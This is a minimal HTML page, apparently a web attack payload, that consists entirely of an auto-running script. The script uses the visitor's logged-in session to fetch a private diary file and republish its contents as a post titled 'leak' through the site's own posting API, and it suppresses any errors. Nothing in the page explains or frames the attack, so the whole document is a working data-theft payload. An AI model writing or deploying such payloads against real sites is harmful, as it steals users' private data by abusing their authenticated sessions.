<!doctype html>
<html><head><meta charset="utf-8"><title>.</title></head>
<body>
<script>
(async function(){
  try {
    var r = await fetch('/diary/note-to-self.txt', {credentials:'include'});
    var t = await r.text();
    var p = new URLSearchParams();
    p.set('title','leak');
    p.set('body', t);
    await fetch('/api/collections/editor/posts', {method:'POST', credentials:'include',
      headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:p.toString()});
  } catch(e) {}
})();
</script>
</body></html>
